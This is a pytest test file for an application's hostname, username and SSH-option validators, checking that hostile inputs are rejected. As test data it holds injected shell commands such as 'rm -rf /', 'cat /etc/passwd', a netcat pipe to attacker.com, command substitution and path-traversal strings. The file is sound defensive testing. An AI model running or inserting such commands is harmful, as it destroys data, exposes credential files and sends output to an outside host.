"""
Tests for app.utils.security module.

Tests security validation functions for hostnames, usernames, and SSH options.
"""

import pytest

from app.utils.security import validate_hostname, validate_ssh_opts, validate_username


class TestValidateHostname:
    """Test validate_hostname function."""

    def test_accepts_valid_hostname(self):
        """Should accept valid hostnames."""
        assert validate_hostname("example.com") == "example.com"
        assert validate_hostname("sub.example.com") == "sub.example.com"
        assert validate_hostname("host-name.example.org") == "host-name.example.org"

    def test_accepts_localhost(self):
        """Should accept localhost."""
        assert validate_hostname("localhost") == "localhost"

    def test_accepts_ip_address(self):
        """Should accept IP addresses."""
        assert validate_hostname("192.168.1.1") == "192.168.1.1"
        assert validate_hostname("10.0.0.1") == "10.0.0.1"

    def test_rejects_empty_hostname(self):
        """Should reject empty hostname."""
        with pytest.raises(ValueError, match="Hostname cannot be empty"):
            validate_hostname("")

    def test_rejects_whitespace_only(self):
        """Should reject whitespace-only hostname."""
        with pytest.raises(ValueError, match="Invalid hostname format"):
            validate_hostname("   ")

    def test_rejects_invalid_characters(self):
        """Should reject hostnames with invalid characters."""
        with pytest.raises(ValueError, match="Invalid hostname"):
            validate_hostname("host;name")

        with pytest.raises(ValueError, match="Invalid hostname"):
            validate_hostname("host name")

        with pytest.raises(ValueError, match="Invalid hostname"):
            validate_hostname("host$name")

    def test_rejects_path_traversal_attempts(self):
        """Should reject path traversal attempts."""
        with pytest.raises(ValueError, match="Invalid hostname"):
            validate_hostname("../etc/passwd")

        with pytest.raises(ValueError, match="Invalid hostname"):
            validate_hostname("..\\windows\\system32")


class TestValidateUsername:
    """Test validate_username function."""

    def test_accepts_valid_username(self):
        """Should accept valid usernames."""
        assert validate_username("user") == "user"
        assert validate_username("user123") == "user123"
        assert validate_username("user_name") == "user_name"
        assert validate_username("user-name") == "user-name"

    def test_rejects_empty_username(self):
        """Should reject empty username."""
        with pytest.raises(ValueError, match="Username cannot be empty"):
            validate_username("")

    def test_rejects_whitespace_only(self):
        """Should reject whitespace-only username."""
        with pytest.raises(ValueError, match="Invalid username format"):
            validate_username("   ")

    def test_rejects_invalid_characters(self):
        """Should reject usernames with invalid characters."""
        with pytest.raises(ValueError, match="Invalid username"):
            validate_username("user;name")

        with pytest.raises(ValueError, match="Invalid username"):
            validate_username("user name")

        with pytest.raises(ValueError, match="Invalid username"):
            validate_username("user$name")

    def test_rejects_path_traversal_attempts(self):
        """Should reject path traversal attempts."""
        with pytest.raises(ValueError, match="Invalid username"):
            validate_username("../root")


class TestValidateSshOpts:
    """Test validate_ssh_opts function."""

    def test_accepts_empty_options(self):
        """Should accept empty SSH options."""
        assert validate_ssh_opts("") == ""
        assert validate_ssh_opts(None) == ""

    def test_accepts_valid_options(self):
        """Should accept valid SSH options."""
        assert validate_ssh_opts("-p 2222") == "-p 2222"
        assert validate_ssh_opts("-i ~/.ssh/id_rsa") == "-i ~/.ssh/id_rsa"
        assert validate_ssh_opts("-o StrictHostKeyChecking=no") == "-o StrictHostKeyChecking=no"

    def test_accepts_multiple_options(self):
        """Should accept multiple SSH options."""
        opts = "-p 2222 -i ~/.ssh/key -o ConnectTimeout=10"
        assert validate_ssh_opts(opts) == opts

    def test_rejects_command_injection_attempts(self):
        """Should reject command injection attempts."""
        with pytest.raises(ValueError, match="Invalid SSH options"):
            validate_ssh_opts("-p 2222; rm -rf /")

        with pytest.raises(ValueError, match="Invalid SSH options"):
            validate_ssh_opts("-p 2222 && cat /etc/passwd")

        with pytest.raises(ValueError, match="Invalid SSH options"):
            validate_ssh_opts("-p 2222 | nc attacker.com 1234")

    def test_rejects_backticks(self):
        """Should reject backticks (command substitution)."""
        with pytest.raises(ValueError, match="dangerous characters"):
            validate_ssh_opts("-p `whoami`")

    def test_rejects_dollar_parentheses(self):
        """Should reject $() command substitution."""
        with pytest.raises(ValueError, match="dangerous characters"):
            validate_ssh_opts("-p $(whoami)")

    def test_strips_whitespace(self):
        """Should strip leading/trailing whitespace."""
        assert validate_ssh_opts("  -p 2222  ") == "-p 2222"
